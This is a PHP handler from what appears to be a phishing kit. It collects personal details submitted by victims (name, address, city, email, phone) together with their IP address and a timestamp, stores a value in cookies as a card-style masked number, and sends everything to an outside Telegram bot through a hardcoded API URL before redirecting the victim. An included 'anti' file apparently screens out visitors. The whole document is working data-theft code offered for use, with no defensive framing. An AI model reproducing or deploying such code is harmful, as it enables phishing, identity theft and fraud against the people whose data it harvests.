<?php
include("../anti/index.php");
$TIME = date("d F Y H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

         if(($_POST['1'] != "")  AND ($_POST['3'] != "") AND ($_POST['4'] != "")) {

        $message .= "______________ca________________\n";
        $message .= "* NAME : ".$_POST['1']."\n";
        $message .= "* Address  : ".$_POST['2']."\n";
        $message .= "* City  : ".$_POST['3']."\n";
        $message .= "* Email  : ".$_POST['4']."\n";
        $message .= "* Phone Number  : ".$_POST['5']."\n";
        $message .= "* IP   : $ip\n";
        $message .= "* Date   :$TIME\n";
        $message .= "______________________________\n";

             setcookie("card",$_POST['3'], time()+3600, "/","", 0);
             $x = '';
             $count =0;
             for ($i =0; $i<strlen($_POST['3'])-4;$i++){
                 $count++;
                 $x.= 'x';
                 if(($count)%4 ===0 ){
                     $x.=" ";
                 }
             }
             $check =  substr($_POST['3'], strlen($_POST['3'])-4, 4);
             $x.= $check;
             setcookie("cardcashed",$x, time()+3600, "/","", 0);

             setcookie("card",$_POST['3'], time()+3600, "/","", 0);
             file_get_contents("https://api.telegram.org/bot6769268217:AAF_PGEOpZoXgj7Xcr4W2X68wbf6zNpV0io/sendMessage?chat_id=-4097212711&text=" . urlencode($message)."" );

        header("Location: ../menu.php");
} else


header("Location: ../index.php");




?>